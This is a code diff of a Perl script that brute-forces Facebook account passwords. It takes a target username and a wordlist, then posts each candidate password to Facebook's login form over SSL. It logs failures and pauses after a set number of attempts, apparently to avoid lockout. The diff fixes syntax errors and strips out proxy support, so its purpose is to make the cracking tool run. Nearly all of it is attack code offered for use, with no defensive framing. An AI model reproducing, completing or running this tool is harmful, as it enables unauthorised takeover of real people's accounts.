@@ -25,7 +25,6 @@ exit; }
 
 my $user = $ARGV[0];
 my $wordlist = $ARGV[1];
-my $proxy = $ARGV[2];
 
 open (LIST, $wordlist) || die "\n[-] Can't find/open $wordlist\n";
 
@@ -45,11 +44,6 @@ print "\033[1;31m          ------------------------------------------------\n";
 print "\033[1;39m\n 		[+] Cracking Started on: $user ...\n\n";
 print "		=======================================================\n";
 print "\n\n";
-
-use strict;
-#use warnings;
-use HTTP::ProxySelector;
-use LWP::UserAgent;
 
 while (my $password = <LIST>) {
 chomp ($password);
@@ -71,7 +65,6 @@ my $cookie = "cookie: datr= UHMSWFpjy9bmjtkajb4ES0ed";
 my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
 my $cl = length($post);
 my $d = "Content-Length: $cl";
-}
 
 
 my ($host, $port) = ("www.facebook.com", 443);
@@ -118,7 +111,7 @@ if (!defined $success)
 print "\033[1;31m[-] $password -> Failed \n";
 close SSL;
 $contrasenas = $contrasenas+1;
-if ($contrasenas = $limite);
+if ($contrasenas = $limite)
 {
 sleep(20);
 }
